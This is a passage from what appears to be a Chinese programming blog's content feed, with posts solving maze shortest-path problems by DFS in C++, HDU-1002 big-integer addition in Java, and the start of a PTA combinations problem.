class="number">1</span>,<span class="number">0</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure><p>其中迷宫由0,1组成，0表示道路，1表示障碍物。<br>现在要根据玩家和游戏中被攻击的虚拟boss所在位置，给玩家以最近距离的提示。<br>最近距离：即玩家走到boss所走的最少步数。（注：路线中的一步是指从一个坐标点走到其上下左右相邻坐标点。）</p><a id="more"></a><h2 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h2><p>输入4个整数a,b,c,d（即玩家和虚拟boss在迷宫中的坐标位置分别为(a,b) 、(c,d)）， 其中 0&lt;&#x3D;a,b,c,d&lt;12。</p><h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>输出在迷宫中从(a,b)出发到达(c,d)的最少步数，如果(a,b)永远无法到达(c,d)则输出10000。</p><h2 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例:"></a>输入样例:</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span><span class="number">0</span> <span class="number">11</span> <span class="number">11</span></span><br></pre></td></tr></table></figure><h2 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span></span><br></pre></td></tr></table></figure><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int a,b,c,d,flag=<span class="number">0</span>,Min;</span><br><span class="line">int Map[<span class="number">12</span>][<span class="number">12</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">int vis[<span class="number">20</span>][<span class="number">20</span>];</span><br><span class="line">int dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">int stepA[<span class="number">100</span>][<span class="number">2</span>];<span class="comment">//记录当前路径</span></span><br><span class="line">int stepB[<span class="number">100</span>][<span class="number">2</span>];<span class="comment">//记录最短路径 </span></span><br><span class="line">void dfs(int x,int y,int step)&#123;</span><br><span class="line">if(step&gt;Min)&#123;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">if(x==c&amp;&amp;y==d)&#123;</span><br><span class="line">Min=step;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">for(int i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">int xx=x+dir[i][<span class="number">0</span>];</span><br><span class="line">int yy=y+dir[i][<span class="number">1</span>];</span><br><span class="line">if(xx&lt;<span class="number">0</span>||yy&lt;<span class="number">0</span>||xx&gt;=<span class="number">12</span>||yy&gt;=<span class="number">12</span>)&#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">if(!vis[xx][yy]&amp;&amp;Map[xx][yy]==<span class="number">0</span>)&#123;</span><br><span class="line">vis[xx][yy]=<span class="number">1</span>;</span><br><span class="line">dfs(xx,yy,step+<span class="number">1</span>);</span><br><span class="line">vis[xx][yy]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">scanf(<span class="string">"%d %d %d %d"</span>,&amp;a,&amp;b,&amp;c,&amp;d);</span><br><span class="line">memset(vis,<span class="number">0</span>,sizeof(vis));</span><br><span class="line">vis[a][b]=<span class="number">1</span>;</span><br><span class="line">Min=<span class="number">10000</span>;</span><br><span class="line">dfs(a,b,<span class="number">0</span>);</span><br><span class="line">if(Min==<span class="number">10000</span>)&#123;</span><br><span class="line">printf(<span class="string">"10000<span class="subst">\n</span>"</span>);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">printf(<span class="string">"%d<span class="subst">\n</span>"</span>,Min);</span><br><span class="line">&#125;</span><br><span class="line">return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDU-1002大数加法(JAVA)</title>
      <link href="/2020/02/02/HDU-1002%E5%A4%A7%E6%95%B0%E5%8A%A0%E6%B3%95-JAVA/"/>
      <url>/2020/02/02/HDU-1002%E5%A4%A7%E6%95%B0%E5%8A%A0%E6%B3%95-JAVA/</url>
      
        <content type="html"><![CDATA[<p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=1002" target="_blank" rel="noopener">HDU-1002</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>对您来说，我有一个非常简单的问题。给定两个整数A和B，您的工作是计算A + B的总和。</p><a id="more"></a><h2 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h2><p>输入的第一行包含一个整数T（1 &lt;&#x3D; T &lt;&#x3D; 20），它表示测试用例的数量。然后是T行，每行由两个正整数A和B组成。请注意，这些整数非常大，这意味着您不应使用32位整数对其进行处理。您可以假设每个整数的长度不超过1000。</p><h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>对于每个测试用例，您应该输出两行。第一行是“ Case＃：”，＃表示测试用例的编号。第二行是等式“ A + B &#x3D; Sum”，Sum表示A + B的结果。请注意，该等式中有一些空格。在两个测试用例之间输出空白行。</p><h2 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入:"></a>样例输入:</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">112233445566778899 </span><span class="number">998877665544332211</span></span><br></pre></td></tr></table></figure><h2 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出:"></a>样例输出:</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Case <span class="number">1</span>:</span><br><span class="line"><span class="number">1</span> + <span class="number">2</span> = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">Case <span class="number">2</span>:</span><br><span class="line"><span class="number">112233445566778899</span> + <span class="number">998877665544332211</span> = <span class="number">1111111111111111110</span></span><br></pre></td></tr></table></figure><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line">        <span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> Main &#123;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String[] args)&#123;</span><br><span class="line">        Scanner <span class="keyword">in</span> = <span class="built_in">new</span> Scanner(<span class="keyword">System</span>.<span class="keyword">in</span>);</span><br><span class="line">        <span class="type">int</span> t = <span class="keyword">in</span>.nextInt();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=t ; i++)&#123;</span><br><span class="line">            BigInteger A = <span class="keyword">in</span>.nextBigInteger();</span><br><span class="line">            BigInteger B = <span class="keyword">in</span>.nextBigInteger();</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println("Case "+i+":");</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(A+" + "+B+" = "+A.<span class="keyword">add</span>(B));</span><br><span class="line">            <span class="keyword">if</span>(i!=t)</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pta-7-51 迷宫寻路 (20分)DFS</title>
      <link href="/2020/02/02/pta-7-51-%E8%BF%B7%E5%AE%AB%E5%AF%BB%E8%B7%AF-20%E5%88%86-DFS/"/>
      <url>/2020/02/02/pta-7-51-%E8%BF%B7%E5%AE%AB%E5%AF%BB%E8%B7%AF-20%E5%88%86-DFS/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个M行N列的迷宫图，其中 “0”表示可通路，”1”表示障碍物，无法通行。在迷宫中只允许在水平或上下四个方向的通路上行走，走过的位置不能重复走。</p><p>5行8列的迷宫如下：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span><span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>则从左上角（1，1）至右下角（5，8）的最短路径为：<br><br>1,1–》2,1–》2,2–》2,3–》3,3–》3,4–》3,5–》4,5–》5,5–》5,6–》5,7–》5,8<br><br>题目保证每个迷宫最多只有一条最短路径。<br><br>请输出该条最短路径，如果不存在任何通路，则输出”NO FOUND”.</p><a id="more"></a><h2 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h2><p>第一行，输入M和N值，表示迷宫行数和列数。<br><br>接着输入M行数值，其中，0表示通路，1表示障碍物。每列数值用空格符间隔。<br><br>接下来可能输入多组迷宫数据。<br><br>当输入M的值为-1时结束输入。</p><h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>按行顺序输出路径的每个位置的行数和列数，如 x,y<br>如果不存在任何路径，则输出”NO FOUND”.<br>每组迷宫寻路结果用换行符间隔。</p><h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span> <span class="number">8</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">4</span> <span class="number">4</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> </span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">-1</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure><h2 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>,<span class="number">1</span></span><br><span class="line"><span class="number">2</span>,<span class="number">1</span></span><br><span class="line"><span class="number">3</span>,<span class="number">1</span></span><br><span class="line"><span class="number">4</span>,<span class="number">1</span></span><br><span class="line"><span class="number">5</span>,<span class="number">1</span></span><br><span class="line"><span class="number">5</span>,<span class="number">2</span></span><br><span class="line"><span class="number">5</span>,<span class="number">3</span></span><br><span class="line"><span class="number">6</span>,<span class="number">3</span></span><br><span class="line"><span class="number">6</span>,<span class="number">4</span></span><br><span class="line"><span class="number">6</span>,<span class="number">5</span></span><br><span class="line"><span class="number">7</span>,<span class="number">5</span></span><br><span class="line"><span class="number">8</span>,<span class="number">5</span></span><br><span class="line"><span class="number">8</span>,<span class="number">6</span></span><br><span class="line"><span class="number">8</span>,<span class="number">7</span></span><br><span class="line"><span class="number">8</span>,<span class="number">8</span></span><br><span class="line"></span><br><span class="line">NO FOUND</span><br></pre></td></tr></table></figure><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int n,m,flag=<span class="number">0</span>,Min;</span><br><span class="line">int Map[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line">int vis[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line">int dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">int stepA[<span class="number">100</span>][<span class="number">2</span>];<span class="comment">//记录当前路径</span></span><br><span class="line">int stepB[<span class="number">100</span>][<span class="number">2</span>];<span class="comment">//记录最短路径 </span></span><br><span class="line">void dfs(int x,int y,int step)&#123;</span><br><span class="line">if(step&gt;Min)&#123;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">if(x==n&amp;&amp;y==m)&#123;</span><br><span class="line">for(int i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">if(stepA[i][<span class="number">0</span>]==<span class="number">-1</span>&amp;&amp;stepA[i][<span class="number">1</span>]==<span class="number">-1</span>)&#123;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">stepB[i][<span class="number">0</span>]=stepA[i][<span class="number">0</span>];</span><br><span class="line">stepB[i][<span class="number">1</span>]=stepA[i][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">Min=step;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">for(int i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">int xx=x+dir[i][<span class="number">0</span>];</span><br><span class="line">int yy=y+dir[i][<span class="number">1</span>];</span><br><span class="line">if(xx&lt;=<span class="number">0</span>||yy&lt;=<span class="number">0</span>||xx&gt;n||yy&gt;m)&#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">if(!vis[xx][yy]&amp;&amp;Map[xx][yy]==<span class="number">0</span>)&#123;</span><br><span class="line">stepA[step][<span class="number">0</span>]=xx;</span><br><span class="line">stepA[step][<span class="number">1</span>]=yy;</span><br><span class="line"></span><br><span class="line">vis[xx][yy]=<span class="number">1</span>;</span><br><span class="line">dfs(xx,yy,step+<span class="number">1</span>);</span><br><span class="line">vis[xx][yy]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">while(scanf(<span class="string">"%d %d"</span>,&amp;n,&amp;m)&amp;&amp;m!=<span class="number">-1</span>)&#123;</span><br><span class="line">for(int i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">for(int j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">scanf(<span class="string">"%d"</span>,&amp;Map[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">memset(vis,<span class="number">0</span>,sizeof(vis));</span><br><span class="line">memset(stepA,<span class="number">-1</span>,sizeof(stepA));</span><br><span class="line">memset(stepB,<span class="number">-1</span>,sizeof(stepB));</span><br><span class="line">vis[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">Min=<span class="number">10000</span>;</span><br><span class="line">dfs(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">if(Min==<span class="number">10000</span>)&#123;</span><br><span class="line">printf(<span class="string">"NO FOUND<span class="subst">\n</span>"</span>);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">printf(<span class="string">"1,1<span class="subst">\n</span>"</span>);</span><br><span class="line">for(int i=<span class="number">0</span>;i&lt;Min;i++)&#123;</span><br><span class="line">printf(<span class="string">"%d,%d<span class="subst">\n</span>"</span>,stepB[i][<span class="number">0</span>],stepB[i][<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">printf(<span class="string">"<span class="subst">\n</span>"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pta-7-49 前t个组合结果 (25分)DFS</title>
      <link href="/2020/02/02/pta-7-49-%E5%89%8Dt%E4%B8%AA%E7%BB%84%E5%90%88%E7%BB%93%E6%9E%9C-25%E5%88%86-DFS/"/>
      <url>/2020/02/02/pta-7-49-%E5%89%8Dt%E4%B8%AA%E7%BB%84%E5%90%88%E7%BB%93%E6%9E%9C-25%E5%88%86-DFS/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>组合结果<br>找出从自然数1、2、… 、n（0&lt;n&lt;&#x3D;30）中任取r(0&lt;r&lt;&#x3D;n)个数的组合，输出其中前t个组合结果。</p><a id="more"></a><h2 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h2><p>在一行中输入n、r、t（1&lt;&#x3D;t&lt;&#x3D;C(n,r））。</p><h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>按特定顺序输出前t个组合结果，每一个组合结果占一行，含第一个整数在内的每一个整数前面都用一个空格，最后一个整数后面没有空格。 特定顺序：每一个组合结果中的值从大到小排列，组合之间按逆字典序排列。</p><h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">5 </span><span class="number">3</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">6 </span><span class="number">4</span> <span class="number">8</span></span><br></pre></td></tr></table></figure><h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">5 </span><span class="number">4</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">4</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">4</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">3</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">3</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">2</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">3</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">3</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">2</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">2</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">6 </span><span class="number">5</span> <span class="number">4</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">5</span> <span class="number">4</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">5</span> <span class="number">4</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">5</span> <span class="number">3</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">5</span> <span class="number">3</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">5</span> <span class="number">2</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">4</span> <span class="number">3</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">4</span> <span class="number">3</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="代码："><a 